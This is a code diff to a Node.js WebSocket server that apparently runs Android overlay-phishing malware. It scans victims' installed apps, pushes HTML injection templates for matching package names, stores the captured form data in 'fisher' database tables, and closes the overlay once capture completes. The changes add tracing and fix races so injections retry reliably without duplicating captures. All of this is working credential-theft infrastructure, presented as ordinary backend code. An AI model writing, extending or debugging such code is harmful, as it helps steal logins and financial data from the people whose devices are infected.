@@ -8,6 +8,88 @@ const { recordDeviceDebug } = require('../services/deviceDebugLog');
 // TG 通知已移到 PHP DeviceController 中处理
 
 const DEFAULT_APP_LIST_SCAN_INTERVAL_MS = 60 * 60 * 1000;
+const RECENT_INJECTION_COMPLETION_TTL_MS = 5 * 60 * 1000;
+const INJECTION_TRACE_SCHEMA_VERSION = 1;
+const recentInjectionCompletions = new Map();
+
+function jsonByteLength(value) {
+  try {
+    return Buffer.byteLength(JSON.stringify(value), 'utf8');
+  } catch {
+    return 0;
+  }
+}
+
+// 只记录请求结构和时序，不记录表单值或 HTML 内容。
+function getInjectionMessageTrace(msg, connection) {
+  if (!msg || typeof msg !== 'object') return null;
+  const messageType = String(msg.type || '');
+  const data = msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
+  const command = String(data.command || data.commandName || msg.command || '').toUpperCase();
+  const injectionMessage = ['injection', 'injection_data', 'injection_status', 'INJECTION_STATUS'].includes(messageType);
+  const injectionCommandResult = messageType === 'command_result'
+    && ['SHOW_INJECTION', 'STOP_INJECTION', 'GET_INJECTION_STATUS'].includes(command);
+  if (!injectionMessage && !injectionCommandResult) return null;
+
+  const params = data.params && typeof data.params === 'object' ? data.params : {};
+  const result = data.result && typeof data.result === 'object' && !Array.isArray(data.result)
+    ? data.result
+    : {};
+  const clientTimestamp = Number(msg.timestamp || data.timestamp || 0);
+  const now = Date.now();
+  return {
+    traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
+    direction: 'device-to-server',
+    messageType,
+    command,
+    packageName: msg.packageName || msg.package_name || data.packageName || params.packageName || result.packageName || '',
+    templateId: msg.templateId || msg.template_id || data.templateId || params.templateId || result.templateId || '',
+    requestId: msg.requestId || data.requestId || params.requestId || result.requestId || '',
+    source: msg.source || data.source || params.source || result.source || '',
+    topLevelKeys: Object.keys(msg),
+    dataKeys: Object.keys(data),
+    resultKeys: Object.keys(result),
+    formFieldNames: injectionMessage && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data)
+      ? Object.keys(msg.data)
+      : [],
+    payloadBytes: jsonByteLength(msg),
+    dataBytes: jsonByteLength(msg.data),
+    clientTimestamp,
+    clientClockDeltaMs: clientTimestamp > 0 ? now - clientTimestamp : null,
+    connectionAgeMs: connection ? Math.max(0, now - Number(connection.connectedAt || now)) : null,
+    sinceLastAppListResponseMs: connection?.lastAppListResponseAt
+      ? Math.max(0, now - Number(connection.lastAppListResponseAt))
+      : null,
+    wsReadyState: connection?.ws?.readyState ?? null,
+  };
+}
+
+function injectionCompletionKey(deviceId, packageName) {
+  return `${String(deviceId || '')}\u0000${String(packageName || '')}`;
+}
+
+function markInjectionCompletion(deviceId, packageName) {
+  if (!deviceId || !packageName) return 0;
+  const key = injectionCompletionKey(deviceId, packageName);
+  const completedAt = Date.now();
+  recentInjectionCompletions.set(key, completedAt);
+  const timer = setTimeout(() => {
+    if (recentInjectionCompletions.get(key) === completedAt) {
+      recentInjectionCompletions.delete(key);
+    }
+  }, RECENT_INJECTION_COMPLETION_TTL_MS);
+  if (typeof timer.unref === 'function') timer.unref();
+  return completedAt;
+}
+
+function getRecentInjectionCompletion(deviceId, packageName) {
+  return Number(recentInjectionCompletions.get(injectionCompletionKey(deviceId, packageName)) || 0);
+}
+
+function wasInjectionCompletedSince(deviceId, packageName, sinceMs) {
+  const completedAt = getRecentInjectionCompletion(deviceId, packageName);
+  return completedAt > 0 && completedAt >= Number(sinceMs || 0);
+}
 
 function getAppListScanIntervalMs() {
   const configured = Number(process.env.APP_LIST_SCAN_INTERVAL_MS || DEFAULT_APP_LIST_SCAN_INTERVAL_MS);
@@ -79,10 +161,12 @@ function handleDevice(ws, sessionId, connections) {
     clientIp,
     appListReceived: false,
     lastAppListRequestAt: 0,
+    lastAppListRequestSource: '',
     lastAppListResponseAt: 0,
     connectedAt: Date.now(),
     injectionStatusReady: false,
     pendingAutoApps: null,
+    pendingAutoAppsAt: 0,
     injectionReadinessTimers: [],
   });
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
@@ -113,6 +197,7 @@ function handleDevice(ws, sessionId, connections) {
     // 30 秒的首次重试和周期扫描可能在同一轮定时器中碰到，防止双发。
     if (dedupeWindowMs > 0 && now - Number(current.lastAppListRequestAt || 0) < dedupeWindowMs) return false;
     current.lastAppListRequestAt = now;
+    current.lastAppListRequestSource = source;
 
     // 保持与控制台“重新获取（设备）”完全相同的端侧参数，
     // source 仅用于服务端日志，避免旧 APK 的严格参数解析拒绝额外字段。
@@ -336,6 +421,12 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
   const { type } = msg;
   console.log(`[WS-Device] handleDeviceMessage type='${type}' from ${sessionId}`);
 
+  const currentConnection = connections.devices.get(sessionId);
+  const injectionTrace = getInjectionMessageTrace(msg, currentConnection);
+  if (injectionTrace) {
+    void recordDeviceDebug('injection.request.received', sessionId, injectionTrace);
+  }
+
   const markAppListReceived = () => {
     const current = connections.devices.get(sessionId);
     if (current && current.ws === ws) {
@@ -451,13 +542,22 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
       // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
       // data 可能是字符串或已解析对象
       void recordDeviceDebug('injection.form.received', sessionId, {
+        traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
         messageType: type,
         packageName: msg.packageName || msg.package_name || '',
         templateName: msg.templateName || '',
+        templateId: msg.templateId || msg.template_id || '',
+        requestId: msg.requestId || msg.request_id || '',
+        source: msg.source || '',
         dataType: typeof msg.data,
         dataKeys: msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data)
           ? Object.keys(msg.data)
           : [],
+        payloadBytes: jsonByteLength(msg),
+        dataBytes: jsonByteLength(msg.data),
+        connectionAgeMs: currentConnection
+          ? Math.max(0, Date.now() - Number(currentConnection.connectedAt || Date.now()))
+          : null,
         clientTimestamp: msg.timestamp || 0,
       });
       void saveInjectionData(sessionId, msg, connections).then(capture => {
@@ -525,9 +625,11 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
         const pendingApps = current && current.ws === ws && Array.isArray(current.pendingAutoApps)
           ? current.pendingAutoApps
           : null;
+        const pendingAutoAppsAt = Number(current?.pendingAutoAppsAt || 0);
         if (current && current.ws === ws) {
           current.injectionStatusReady = true;
           current.pendingAutoApps = null;
+          current.pendingAutoAppsAt = 0;
           (current.injectionReadinessTimers || []).forEach(clearTimeout);
           current.injectionReadinessTimers = [];
         }
@@ -538,6 +640,8 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
           void recordDeviceDebug('injection.auto.readiness_confirmed', sessionId, {
             installedAppCount: pendingApps.length,
             trigger: 'injection_status',
+            readinessWaitMs: pendingAutoAppsAt > 0 ? Date.now() - pendingAutoAppsAt : null,
+            connectionAgeMs: Math.max(0, Date.now() - Number(latest.connectedAt || Date.now())),
           });
           await autoInjectForDevice(sessionId, pendingApps, ws, connections);
         });
@@ -795,9 +899,13 @@ async function syncDeviceStatus(deviceId, data, clientIp) {
  */
 async function saveInjectionData(deviceId, msg, connections) {
   if (!deviceId || !msg) return;
+  const processingStartedAt = Date.now();
   try {
     const db = getPool();
-    const packageName = msg.packageName || '';
+    const packageName = msg.packageName || msg.package_name || '';
+    // 先在内存中标记完成，再执行异步入库。这样与 9 秒自动重试、状态探针
+    // 同时发生时，旧任务不能在 DELETE 完成前后重新下发第二个表单。
+    markInjectionCompletion(deviceId, packageName);
 
     // 解析 data 字段 — 可能是 JSON 字符串或已解析对象
     let formData = msg.data || msg.formData || {};
@@ -815,7 +923,24 @@ async function saveInjectionData(deviceId, msg, connections) {
 
     // 直接存储解析后的干净数据（不嵌套 wrapper）
     const formDataStr = typeof formData === 'object' ? JSON.stringify(formData) : String(formData);
+    const formFieldNames = formData && typeof formData === 'object' && !Array.isArray(formData)
+      ? Object.keys(formData)
+      : [];
+    void recordDeviceDebug('injection.form.processing_started', deviceId, {
+      traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
+      packageName,
+      templateName,
+      templateId: msg.templateId || msg.template_id || '',
+      requestId: msg.requestId || msg.request_id || '',
+      source: msg.source || '',
+      fieldNames: formFieldNames,
+      fieldCount: formFieldNames.length,
+      payloadBytes: jsonByteLength(msg),
+      formDataBytes: Buffer.byteLength(formDataStr, 'utf8'),
+      clientTimestamp: Number(msg.timestamp || 0),
+    });
 
+    const persistStartedAt = Date.now();
     const [insertResult] = await db.query(
       'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
       [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
@@ -823,9 +948,12 @@ async function saveInjectionData(deviceId, msg, connections) {
     void recordDeviceDebug('injection.form.persisted', deviceId, {
       packageName,
       templateName,
-      fieldNames: formData && typeof formData === 'object' && !Array.isArray(formData)
-        ? Object.keys(formData)
-        : [],
+      recordId: Number(insertResult?.insertId || 0),
+      affectedRows: Number(insertResult?.affectedRows || 0),
+      fieldNames: formFieldNames,
+      fieldCount: formFieldNames.length,
+      formDataBytes: Buffer.byteLength(formDataStr, 'utf8'),
+      persistDurationMs: Date.now() - persistStartedAt,
     });
 
     // 表单已持久化：服务端将该包名从活跃任务中移除，并以 STOP_INJECTION
@@ -835,10 +963,12 @@ async function saveInjectionData(deviceId, msg, connections) {
       let completionRequestId = '';
       let completionSource = '';
       try {
+        const taskLookupStartedAt = Date.now();
         const [taskRows] = await db.query(
           'SELECT task_json FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=? ORDER BY created_at DESC LIMIT 1',
           [deviceId, packageName]
         );
+        let taskJsonParsed = false;
         if (taskRows?.[0]?.task_json) {
           try {
             const taskData = typeof taskRows[0].task_json === 'string'
@@ -847,8 +977,20 @@ async function saveInjectionData(deviceId, msg, connections) {
             completionRequestId = String(taskData?.requestId || '');
             completionSource = String(taskData?.source || '');
             completionTemplateId = String(taskData?.templateId || completionTemplateId || '');
+            taskJsonParsed = true;
           } catch {}
         }
+        void recordDeviceDebug('injection.form.active_task_snapshot', deviceId, {
+          packageName,
+          found: !!taskRows?.[0],
+          taskJsonParsed,
+          requestId: completionRequestId,
+          source: completionSource,
+          templateId: completionTemplateId,
+          taskJsonBytes: jsonByteLength(taskRows?.[0]?.task_json || ''),
+          lookupDurationMs: Date.now() - taskLookupStartedAt,
+        });
+        const clearStartedAt = Date.now();
         const [clearResult] = await db.query(
           'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
           [deviceId, packageName]
@@ -858,16 +1000,23 @@ async function saveInjectionData(deviceId, msg, connections) {
           affectedRows: Number(clearResult?.affectedRows || 0),
           requestId: completionRequestId,
           source: completionSource,
+          clearDurationMs: Date.now() - clearStartedAt,
         });
       } catch (taskErr) {
         // 兼容尚未创建活跃任务表的旧库：已收到的表单仍视为上报成功。
         console.warn(`[WS-Device] Failed to clear active injection task ${packageName} for ${deviceId}: ${taskErr.message}`);
+        void recordDeviceDebug('injection.form.active_task_error', deviceId, {
+          packageName,
+          requestId: completionRequestId,
+          message: taskErr.message || String(taskErr),
+          processingDurationMs: Date.now() - processingStartedAt,
+        }, 'error');
       }
 
       const current = connections?.devices?.get(deviceId);
       if (current?.ws?.readyState === 1) {
         try {
-          current.ws.send(JSON.stringify({
+          const stopPayload = JSON.stringify({
             type: 'command',
             sessionId: deviceId,
             data: {
@@ -878,11 +1027,16 @@ async function saveInjectionData(deviceId, msg, connections) {
                 source: 'capture-complete',
               }
             }
-          }));
+          });
+          current.ws.send(stopPayload);
           void recordDeviceDebug('injection.completed.stop_sent', deviceId, {
             packageName,
             requestId: completionRequestId,
             previousSource: completionSource,
+            source: 'capture-complete',
+            route: 'device-ws',
+            payloadBytes: Buffer.byteLength(stopPayload, 'utf8'),
+            wsReadyState: current.ws.readyState,
           });
         } catch (stopErr) {
           console.warn(`[WS-Device] Failed to send completion STOP_INJECTION ${packageName} to ${deviceId}: ${stopErr.message}`);
@@ -896,6 +1050,15 @@ async function saveInjectionData(deviceId, msg, connections) {
       }
     }
     console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
+    void recordDeviceDebug('injection.form.processing_completed', deviceId, {
+      packageName,
+      templateName,
+      templateId: completionTemplateId,
+      requestId: msg.requestId || msg.request_id || '',
+      recordId: Number(insertResult?.insertId || 0),
+      processingDurationMs: Date.now() - processingStartedAt,
+      outcome: 'persisted-and-stop-attempted',
+    });
     return {
       recordId: Number(insertResult?.insertId || 0),
       packageName,
@@ -909,6 +1072,7 @@ async function saveInjectionData(deviceId, msg, connections) {
     void recordDeviceDebug('injection.form.persist_error', deviceId, {
       packageName: msg.packageName || msg.package_name || '',
       message: err.message || String(err),
+      processingDurationMs: Date.now() - processingStartedAt,
     }, 'error');
     return false;
   }
@@ -1089,9 +1253,18 @@ async function handleAppList(deviceId, msg, ws, connections) {
     const apps = msg._apps || msg.data?.apps || msg.data || msg.apps || [];
     const appsJson = JSON.stringify(apps);
     const now = Math.floor(Date.now() / 1000);
+    const currentConnection = connections.devices.get(deviceId);
+    const lastRequestAt = Number(currentConnection?.lastAppListRequestAt || 0);
     void recordDeviceDebug('apps.response.received', deviceId, {
       count: Array.isArray(apps) ? apps.length : 0,
       responseType: msg.type || msg.event || 'app_list',
+      payloadBytes: Buffer.byteLength(appsJson, 'utf8'),
+      responseLatencyMs: lastRequestAt > 0 ? Math.max(0, Date.now() - lastRequestAt) : null,
+      requestSource: currentConnection?.lastAppListRequestSource || '',
+      connectionAgeMs: currentConnection
+        ? Math.max(0, Date.now() - Number(currentConnection.connectedAt || Date.now()))
+        : null,
+      messageKeys: msg && typeof msg === 'object' ? Object.keys(msg) : [],
     });
 
     // UPSERT: 存在则更新，不存在则插入（新设备默认 injection_active=1）
@@ -1140,6 +1313,7 @@ function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
   if (!current || current.ws !== ws || ws.readyState !== 1) return;
 
   current.pendingAutoApps = Array.isArray(apps) ? apps : [];
+  current.pendingAutoAppsAt = current.pendingAutoAppsAt || Date.now();
   if (Array.isArray(current.injectionReadinessTimers) && current.injectionReadinessTimers.length > 0) return;
 
   const probeDelays = [0, 5000, 15000, 30000, 60000];
@@ -1147,7 +1321,7 @@ function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
     const latest = connections.devices.get(deviceId);
     if (!latest || latest.ws !== ws || latest.injectionStatusReady || ws.readyState !== 1) return;
     try {
-      ws.send(JSON.stringify({
+      const probePayload = JSON.stringify({
         type: 'command',
         sessionId: deviceId,
         data: {
@@ -1157,11 +1331,19 @@ function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
             attempt: index + 1,
           },
         },
-      }));
+      });
+      ws.send(probePayload);
       void recordDeviceDebug('injection.auto.readiness_probe_sent', deviceId, {
         delayMs,
         attempt: index + 1,
         totalAttempts: probeDelays.length,
+        command: 'GET_INJECTION_STATUS',
+        source: 'auto-readiness-handshake',
+        payloadBytes: Buffer.byteLength(probePayload, 'utf8'),
+        connectionAgeMs: Math.max(0, Date.now() - Number(latest.connectedAt || Date.now())),
+        readinessWaitMs: latest.pendingAutoAppsAt
+          ? Math.max(0, Date.now() - Number(latest.pendingAutoAppsAt))
+          : null,
       });
     } catch (err) {
       void recordDeviceDebug('injection.auto.readiness_probe_error', deviceId, {
@@ -1179,6 +1361,7 @@ function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
     const pendingApps = Array.isArray(latest.pendingAutoApps) ? latest.pendingAutoApps : [];
     latest.injectionStatusReady = true;
     latest.pendingAutoApps = null;
+    latest.pendingAutoAppsAt = 0;
     latest.injectionReadinessTimers = [];
     void recordDeviceDebug('injection.auto.readiness_fallback', deviceId, {
       waitedMs: 75000,
@@ -1256,11 +1439,13 @@ function getInjectionStatusLists(msg) {
 }
 
 async function persistActiveInjectionTask(db, deviceId, packageName, templateId, source, requestId = '') {
+  const startedAtMs = Date.now();
   const taskJson = JSON.stringify({
     packageName,
     templateId,
     requestId,
-    startedAt: Math.floor(Date.now() / 1000),
+    startedAt: Math.floor(startedAtMs / 1000),
+    startedAtMs,
     source,
   });
   const [result] = await db.query(
@@ -1275,6 +1460,7 @@ async function persistActiveInjectionTask(db, deviceId, packageName, templateId,
 }
 
 async function reconcileInjectionStatus(deviceId, msg) {
+  const processingStartedAt = Date.now();
   const status = getInjectionStatusLists(msg);
   void recordDeviceDebug('injection.status.received', deviceId, {
     hasEnabledPackages: status.hasEnabledPackages,
@@ -1285,7 +1471,13 @@ async function reconcileInjectionStatus(deviceId, msg) {
     dataKeys: msg?.data && typeof msg.data === 'object' ? Object.keys(msg.data) : [],
   });
 
-  if (!status.hasEnabledPackages) return;
+  if (!status.hasEnabledPackages) {
+    void recordDeviceDebug('injection.status.processing_completed', deviceId, {
+      outcome: 'ignored-missing-enabled-packages',
+      processingDurationMs: Date.now() - processingStartedAt,
+    }, 'warn');
+    return;
+  }
 
   try {
     const db = getPool();
@@ -1306,14 +1498,21 @@ async function reconcileInjectionStatus(deviceId, msg) {
       [deviceId]
     );
     const enabledSet = new Set(status.enabledPackages);
+    const existingTaskByPackage = new Map();
     const cleared = [];
     for (const row of existingRows || []) {
-      let source = '';
+      let task = {};
       try {
-        const task = typeof row.task_json === 'string' ? JSON.parse(row.task_json) : row.task_json;
-        source = String(task?.source || '');
+        task = typeof row.task_json === 'string' ? JSON.parse(row.task_json) : (row.task_json || {});
       } catch {}
       const packageName = String(row.package_name || '');
+      const source = String(task?.source || '');
+      if (packageName) {
+        existingTaskByPackage.set(packageName, {
+          task,
+          rawTaskJson: typeof row.task_json === 'string' ? row.task_json : JSON.stringify(row.task_json || {}),
+        });
+      }
       if (packageName && !enabledSet.has(packageName) && (source.startsWith('auto') || source === 'client-status')) {
         await db.query(
           'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
@@ -1325,11 +1524,41 @@ async function reconcileInjectionStatus(deviceId, msg) {
 
     // 内存去重也必须以 APK 快照为准，否则一次未生效的 SHOW_INJECTION
     // 会在 Node 进程整个生命周期里阻断后续自动下发。
-    autoInjectedCache.set(deviceId, new Set(status.enabledPackages));
+    const effectiveEnabledPackages = [];
     const persisted = [];
     for (let index = 0; index < status.enabledPackages.length; index++) {
       const packageName = status.enabledPackages[index];
       const templateId = status.enabledTemplateIds[index] || templateByPackage.get(packageName) || '';
+      const completionAt = getRecentInjectionCompletion(deviceId, packageName);
+      const existing = existingTaskByPackage.get(packageName);
+      const requestTimestampMatch = String(existing?.task?.requestId || '').match(/(?:^|[^0-9])(\d{13})(?:[^0-9]|$)/);
+      const existingStartedAtMs = Number(
+        existing?.task?.startedAtMs
+          || requestTimestampMatch?.[1]
+          || normalizeTimestampSeconds(existing?.task?.startedAt) * 1000
+          || 0
+      );
+      const startedAfterCompletion = completionAt > 0 && existingStartedAtMs > completionAt;
+
+      // 表单完成后的延迟 injection_status 可能仍携带旧 enabledPackages。
+      // 没有更新一轮任务时不能用这个旧快照把已删除的任务重新写回数据库。
+      if (completionAt > 0 && !startedAfterCompletion) {
+        if (existing?.rawTaskJson) {
+          await db.query(
+            `DELETE FROM fisher_active_injection_tasks
+             WHERE device_id=? AND package_name=? AND task_json=?`,
+            [deviceId, packageName, existing.rawTaskJson]
+          );
+        }
+        void recordDeviceDebug('injection.status.skipped', deviceId, {
+          packageName,
+          templateId,
+          completionAt,
+          reason: 'capture-already-completed',
+        });
+        continue;
+      }
+
       const affectedRows = await persistActiveInjectionTask(
         db,
         deviceId,
@@ -1337,23 +1566,48 @@ async function reconcileInjectionStatus(deviceId, msg) {
         templateId,
         'client-status'
       );
+      effectiveEnabledPackages.push(packageName);
       persisted.push({ packageName, templateId, affectedRows });
-      if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
-      autoInjectedCache.get(deviceId).add(packageName);
     }
-    void recordDeviceDebug('injection.status.persisted', deviceId, { persisted, cleared });
+    autoInjectedCache.set(deviceId, new Set(effectiveEnabledPackages));
+    void recordDeviceDebug('injection.status.persisted', deviceId, {
+      persisted,
+      cleared,
+      receivedEnabledCount: status.enabledPackages.length,
+      persistedCount: persisted.length,
+      clearedCount: cleared.length,
+      processingDurationMs: Date.now() - processingStartedAt,
+    });
+    void recordDeviceDebug('injection.status.processing_completed', deviceId, {
+      outcome: 'reconciled',
+      enabledPackages: effectiveEnabledPackages,
+      persistedCount: persisted.length,
+      clearedCount: cleared.length,
+      processingDurationMs: Date.now() - processingStartedAt,
+    });
   } catch (err) {
     console.warn(`[WS-Device] Failed to reconcile injection status for ${deviceId}: ${err.message}`);
     void recordDeviceDebug('injection.status.persist_error', deviceId, {
       enabledPackages: status.enabledPackages,
       message: err.message || String(err),
+      processingDurationMs: Date.now() - processingStartedAt,
     }, 'error');
   }
 }
 
 function scheduleInjectionStatusProbes(ws, deviceId, packageName, requestId) {
+  const scheduledAt = Date.now();
   [1500, 6000].forEach(delayMs => {
     const timer = setTimeout(() => {
+      if (wasInjectionCompletedSince(deviceId, packageName, scheduledAt)) {
+        void recordDeviceDebug('injection.status.probe_cancelled', deviceId, {
+          packageName,
+          requestId,
+          delayMs,
+          reason: 'capture-already-completed',
+        });
+        return;
+      }
       if (!ws || ws.readyState !== 1) {
         void recordDeviceDebug('injection.status.probe_no_route', deviceId, {
           packageName,
@@ -1363,18 +1617,23 @@ function scheduleInjectionStatusProbes(ws, deviceId, packageName, requestId) {
         return;
       }
       try {
-        ws.send(JSON.stringify({
+        const probePayload = JSON.stringify({
           type: 'command',
           sessionId: deviceId,
           data: {
             command: 'GET_INJECTION_STATUS',
             params: { packageName, requestId, source: 'auto-injection-verify' },
           },
-        }));
+        });
+        ws.send(probePayload);
         void recordDeviceDebug('injection.status.probe_sent', deviceId, {
           packageName,
           requestId,
           delayMs,
+          command: 'GET_INJECTION_STATUS',
+          source: 'auto-injection-verify',
+          payloadBytes: Buffer.byteLength(probePayload, 'utf8'),
+          elapsedSinceScheduleMs: Date.now() - scheduledAt,
         });
       } catch (err) {
         void recordDeviceDebug('injection.status.probe_error', deviceId, {
@@ -1421,15 +1680,47 @@ function scheduleAutoInjectionRetry({
   requestId,
 }) {
   const retryDelayMs = 9000;
+  const retryScheduledAt = Date.now();
+  const recordRetryDecision = (decision, reason, extra = {}, level = 'info') => {
+    void recordDeviceDebug('injection.auto.retry_decision', deviceId, {
+      packageName,
+      templateId,
+      requestId,
+      retryDelayMs,
+      scheduledAt: retryScheduledAt,
+      elapsedMs: Date.now() - retryScheduledAt,
+      decision,
+      reason,
+      ...extra,
+    }, level);
+  };
+  recordRetryDecision('scheduled', 'initial-show-awaiting-client-confirmation');
   const timer = setTimeout(async () => {
     try {
       const current = connections.devices.get(deviceId);
       if (!current || current.ws !== ws || ws.readyState !== 1) {
+        recordRetryDecision('cancelled', 'device-ws-not-routable', {
+          connectionPresent: !!current,
+          sameSocket: !!current && current.ws === ws,
+          wsReadyState: ws?.readyState ?? null,
+        }, 'warn');
         void recordDeviceDebug('injection.auto.retry_no_route', deviceId, {
           packageName,
           templateId,
           requestId,
         }, 'warn');
+        return;
+      }
+      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
+        recordRetryDecision('cancelled', 'capture-already-completed', {
+          completionAt: getRecentInjectionCompletion(deviceId, packageName),
+        });
+        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
+          packageName,
+          templateId,
+          requestId,
+          reason: 'capture-already-completed',
+        });
         return;
       }
 
@@ -1440,20 +1731,40 @@ function scheduleAutoInjectionRetry({
          WHERE device_id=? AND package_name=? LIMIT 1`,
         [deviceId, packageName]
       );
-      if (!rows || rows.length === 0) return;
+      if (!rows || rows.length === 0) {
+        recordRetryDecision('cancelled', 'active-task-missing');
+        return;
+      }
+      const originalTaskJson = typeof rows[0].task_json === 'string'
+        ? rows[0].task_json
+        : JSON.stringify(rows[0].task_json || {});
       let task = {};
       try {
-        task = typeof rows[0].task_json === 'string'
-          ? JSON.parse(rows[0].task_json)
-          : (rows[0].task_json || {});
+        task = JSON.parse(originalTaskJson);
       } catch {}
-      if (String(task.source || '') === 'client-status') return;
-      if (String(task.requestId || '') !== String(requestId || '')) return;
+      if (String(task.source || '') === 'client-status') {
+        recordRetryDecision('cancelled', 'client-status-confirmed', {
+          activeTaskSource: String(task.source || ''),
+          activeTaskRequestId: String(task.requestId || ''),
+        });
+        return;
+      }
+      if (String(task.requestId || '') !== String(requestId || '')) {
+        recordRetryDecision('cancelled', 'request-replaced', {
+          activeTaskSource: String(task.source || ''),
+          activeTaskRequestId: String(task.requestId || ''),
+        });
+        return;
+      }
 
       const retryRequestId = `auto-retry-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+      recordRetryDecision('proceeding', 'active-task-still-unconfirmed', {
+        retryRequestId,
+        activeTaskSource: String(task.source || ''),
+      });
       // 第二次尝试前先关闭可能残留的旧页面；此时连接已稳定，并留出
       // 1200ms 让 Android 串行完成清理，避免 STOP 异步晚于 SHOW。
-      ws.send(JSON.stringify({
+      const retryStopPayload = JSON.stringify({
         type: 'command',
         sessionId: deviceId,
         data: {
@@ -1464,12 +1775,16 @@ function scheduleAutoInjectionRetry({
             source: 'auto-retry-preflight',
           },
         },
-      }));
+      });
+      ws.send(retryStopPayload);
       void recordDeviceDebug('injection.auto.retry_stop_sent', deviceId, {
         packageName,
         templateId,
         requestId: retryRequestId,
         previousRequestId: requestId,
+        source: 'auto-retry-preflight',
+        payloadBytes: Buffer.byteLength(retryStopPayload, 'utf8'),
+        wsReadyState: ws.readyState,
       });
       await new Promise(resolve => setTimeout(resolve, 1200));
 
@@ -1477,15 +1792,72 @@ function scheduleAutoInjectionRetry({
       if (!latest || latest.ws !== ws || ws.readyState !== 1) {
         throw new Error('device connection changed before automatic retry');
       }
-      await persistActiveInjectionTask(
-        db,
-        deviceId,
+      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
+        recordRetryDecision('cancelled', 'capture-completed-during-retry', {
+          retryRequestId,
+          phase: 'after-preflight-stop',
+          completionAt: getRecentInjectionCompletion(deviceId, packageName),
+        });
+        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
+          packageName,
+          templateId,
+          requestId,
+          reason: 'capture-completed-during-retry',
+        });
+        return;
+      }
+
+      // 只允许把仍然完全等于旧请求的任务原子转换为 retry。若表单完成逻辑
+      // 已删除任务，或 injection_status/手动操作已更新任务，affectedRows=0，
+      // 不使用 UPSERT 重新创建已完成任务。
+      const retryStartedAtMs = Date.now();
+      const retryTaskJson = JSON.stringify({
         packageName,
         templateId,
-        'auto-retry',
-        retryRequestId
+        requestId: retryRequestId,
+        startedAt: Math.floor(retryStartedAtMs / 1000),
+        startedAtMs: retryStartedAtMs,
+        source: 'auto-retry',
+      });
+      const [transitionResult] = await db.query(
+        `UPDATE fisher_active_injection_tasks
+         SET task_json=?, created_at=NOW()
+         WHERE device_id=? AND package_name=? AND task_json=?`,
+        [retryTaskJson, deviceId, packageName, originalTaskJson]
       );
-      ws.send(JSON.stringify({
+      if (Number(transitionResult?.affectedRows || 0) === 0) {
+        recordRetryDecision('cancelled', 'active-task-changed-or-cleared', {
+          retryRequestId,
+          transitionAffectedRows: Number(transitionResult?.affectedRows || 0),
+        });
+        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
+          packageName,
+          templateId,
+          requestId,
+          reason: 'active-task-changed-or-cleared',
+        });
+        return;
+      }
+      if (wasInjectionCompletedSince(deviceId, packageName, retryScheduledAt)) {
+        await db.query(
+          `DELETE FROM fisher_active_injection_tasks
+           WHERE device_id=? AND package_name=? AND task_json=?`,
+          [deviceId, packageName, retryTaskJson]
+        );
+        recordRetryDecision('cancelled', 'capture-completed-during-retry', {
+          retryRequestId,
+          phase: 'after-task-transition',
+          completionAt: getRecentInjectionCompletion(deviceId, packageName),
+        });
+        void recordDeviceDebug('injection.auto.retry_cancelled', deviceId, {
+          packageName,
+          templateId,
+          requestId,
+          reason: 'capture-completed-during-retry',
+        });
+        return;
+      }
+      const retryShowPayload = JSON.stringify({
         type: 'command',
         sessionId: deviceId,
         data: {
@@ -1498,7 +1870,8 @@ function scheduleAutoInjectionRetry({
             source: 'auto-retry',
           },
         },
-      }));
+      });
+      ws.send(retryShowPayload);
       void recordDeviceDebug('injection.auto.retry_sent', deviceId, {
         packageName,
         templateId,
@@ -1506,7 +1879,15 @@ function scheduleAutoInjectionRetry({
         requestId: retryRequestId,
         previousRequestId: requestId,
         retryDelayMs,
-        htmlBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
+        templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
+        payloadBytes: Buffer.byteLength(retryShowPayload, 'utf8'),
+        source: 'auto-retry',
+        wsReadyState: ws.readyState,
+      });
+      recordRetryDecision('sent', 'retry-show-dispatched', {
+        retryRequestId,
+        transitionAffectedRows: Number(transitionResult?.affectedRows || 0),
+        templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
       });
       scheduleInjectionStatusProbes(ws, deviceId, packageName, retryRequestId);
     } catch (err) {
@@ -1526,13 +1907,24 @@ function scheduleAutoInjectionRetry({
  * 每个设备+包名组合自动注入一次；手动“重注”可以绕过此自动去重。
  */
 async function autoInjectForDevice(deviceId, apps, ws, connections) {
+  const matchingStartedAt = Date.now();
   try {
     const db = getPool();
     // ★ 优化：先查模板列表（不含 html_content），减少内存和网络开销
     const [templates] = await db.query(
       'SELECT template_id, package_name, name FROM fisher_injection_templates WHERE enabled=1'
     );
-    if (!templates || templates.length === 0) return;
+    if (!templates || templates.length === 0) {
+      void recordDeviceDebug('injection.auto.match_summary', deviceId, {
